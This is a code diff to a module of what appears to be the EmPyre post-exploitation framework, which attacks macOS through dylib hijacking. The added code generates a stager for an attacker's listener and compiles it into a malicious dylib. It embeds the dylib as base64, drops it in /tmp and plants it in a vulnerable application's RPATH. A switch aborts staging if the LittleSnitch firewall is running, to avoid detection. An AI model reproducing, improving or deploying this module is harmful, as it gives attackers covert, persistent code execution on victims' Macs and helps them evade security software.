@@ -1,3 +1,4 @@
+import base64
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -19,7 +20,7 @@ class Module:
             # File extension to save the file as
             'OutputExtension' : "",
 
-            'NeedsAdmin' : False,
+            'NeedsAdmin' : True,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
@@ -41,12 +42,27 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'HijackerPath' : {
-                'Description'   :   'Full path to the EmPyre dylib to utilize in the attack',
+            'Listener' : {
+                'Description'   :   'Listener to use.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'DylibPath' : {
+            'Arch' : {
+                'Description'   :   'Arch: x86/x64',
+                'Required'      :   True,
+                'Value'         :   'x86'
+            },
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
+                'Required'      :   True,
+                'Value'         :   'True'
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'LegitimateDylibPath' : {
                 'Description'   :   'Full path to the legitimate dylib of the vulnerable application',
                 'Required'      :   True,
                 'Value'         :   ''
@@ -81,13 +97,20 @@ class Module:
         #
         # the script should be stripped of comments, with a link to any
         #   original reference script included in the comments.
-        hijacker = self.options['HijackerPath']['Value']
-        dylib = self.options['DylibPath']['Value']
+        listenerName = self.options['Listener']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        LittleSnitch = self.options['LittleSnitch']['Value']
+        arch = self.options['Arch']['Value']
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, littlesnitch=LittleSnitch)
+        launcher = launcher.strip('echo').strip(' | python &').strip("\"")
+        dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch)
+        encodedDylib = base64.b64encode(dylibBytes)
+        dylib = self.options['LegitimateDylibPath']['Value']
         vrpath = self.options['VulnerableRPATH']['Value']
 
         script = """
 from ctypes import *
-def run():
+def run(attackerDYLIB):
 
     import ctypes
     import io
@@ -456,13 +479,12 @@ def run():
 
         return True
 
-    #attacker .dylib
-    attackerDYLIB = "%s"
-
+    
     #target .dylib
     targetDYLIB = "%s"
 
     vrpath = "%s"
+
 
     #configured .dylib
     configuredDYLIB = ""
@@ -509,7 +531,17 @@ def run():
     #dbg msg
     
     print '\\nHijacker created, renamed to %%s, and copied to %%s' %% (configuredDYLIB,vrpath)
-run()
-""" % (hijacker,dylib,vrpath)
+
+import base64
+import uuid
+encbytes = "%s"
+filename = str(uuid.uuid4())
+path = "/tmp/" + filename + ".dylib"
+decodedDylib = base64.b64decode(encbytes)
+temp = open(path,'wb')
+temp.write(decodedDylib)
+temp.close()
+run(path)
+""" % (dylib,vrpath,encodedDylib)
 
         return script
